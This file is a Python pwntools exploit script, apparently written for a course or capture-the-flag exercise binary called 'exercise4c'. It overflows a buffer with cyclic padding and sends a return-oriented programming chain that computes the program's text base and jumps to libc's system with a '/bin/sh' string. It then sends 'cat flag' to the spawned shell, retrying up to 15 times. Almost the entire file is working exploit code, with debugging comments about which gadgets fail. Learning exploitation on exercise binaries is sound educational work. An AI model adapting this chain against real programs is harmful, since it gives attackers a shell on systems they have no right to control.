#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()
    #input()
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,
    # p.sendline("AAAAA")
    # p.recvline()
    #print(cyclic_find(0x6261616A)) # 136
    r.sendline(b"ABCD") # Not sure why this helps?
    # Do the rop chain
    #buf_start = 0x07FFFFFFFDD70 # as NOASLR always the same
    get_msg_add = 0x00555555555215 # only used for text base
    rop = ROP(exe)
    gm_text_addr = rop.resolve("get_message")
    text_base = get_msg_add-gm_text_addr
    print(f"text_base: {hex(text_base)}")
    # do it now
    #rop(rdi=buf_start) # does not work as it's only text offset
    # align stack and move pointer to rdi
    #start_main_add = 0x1555553420B3 - 0xf3 # no ASLR or PIE? TODO LOL, not sure this will work on grading machine
    start_main_add = r.libc.symbols['__libc_start_main']
    str_bin_sh = start_main_add + 0x1905ea
    xor_poprdi_poprbp = 0x11d3
    rop.raw(text_base + xor_poprdi_poprbp)
    #unused_add = 0x011C9
    #rop.raw(text_base + unused_add)
    #rop.raw(buf_start)  # pop rdi
    rop.raw(str_bin_sh) # pop rdi directly into libc
    rop.raw(0x07FFFFFFFDA80)     # pop rbp # just valid aligned stack address
    pop_rsi_pop_add = 0x01321 # pop rsi; pop r15; ret;
    rop.raw(text_base + pop_rsi_pop_add)
    rop.raw(0x0) # zero them out
    rop.raw(0x0)
    rop.raw(text_base + 0x00101a) # alignment ret
    system_add = start_main_add + 0x2e450
    rop.raw(system_add) # --> fails???
    #exit_add = start_main_add + 0x22c00
    #rop.raw(exit_add) # --> works
    #execve_add = start_main_add + 0xbf330
    #rop.raw(execve_add) # --> not sure what it helps
    #rop.raw(text_base + 0x000000000000101a) # alignment ret
    rop.raw(system_add) # Valid return for the system --> works
    #rop.raw(get_msg_add) # Valid return for the system --> works
    #print(rop.dump())

    # Send rop chain
    raw_rop = rop.chain()
    cat_flag  = b"aaaabbbb\x00" # Not used anymore, as no stack addressing
    r.sendline(b"\x00"*8 + cat_flag*4 + cyclic(128-len(cat_flag*4)) + raw_rop)
    r.sendline(b"cat flag")
    print(r.recvall(timeout=1).decode())

for i in range(15):
    try:
        exploit()
    except:
        pass
